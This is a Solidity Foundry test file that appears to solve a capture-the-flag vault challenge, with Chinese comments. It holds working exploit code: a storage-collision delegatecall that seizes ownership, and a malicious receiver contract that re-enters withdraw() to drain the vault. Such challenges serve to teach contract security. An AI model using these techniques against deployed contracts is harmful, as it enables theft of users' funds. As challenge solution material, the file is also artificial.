// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";
import "../src/Attacker.sol";




// 恶意合约，用于重入攻击
contract MaliciousReceiver {
    Vault public vault;
    uint256 public count;
    
    constructor(address payable _vault) {
        vault = Vault(_vault);
    }
    
    receive() external payable {
        // 重入攻击：如果合约还有余额，继续提取
        if (address(vault).balance > 0 && count < 10) {
            count++;
            vault.withdraw();
        }
    }
    
    function attack() external {
        vault.withdraw();
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attacker attacker = new Attacker(payable(address(vault)));
        //设置attacker为owner
        address logicAddr = address(logic);
        bytes memory data = abi.encodeWithSelector(
            VaultLogic.changeOwner.selector, 
            bytes32(uint256(uint160(logicAddr))),
            address(attacker)  // 将恶意合约设为owner
        );
        (bool success, ) = address(vault).call(data);
        require(success, "Delegatecall failed");
        
        // 切换到恶意合约的上下文
        vm.stopPrank();


        vm.startPrank(address(attacker));
        // 给恶意合约提供资金
        vm.deal(address(attacker), 1 ether);
        
        // 开启提款
        vault.openWithdraw();
        
        // 恶意合约存入少量资金
        vault.deposite{value: 0.01 ether}();
        
        // 启动重入攻击
        attacker.attack();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
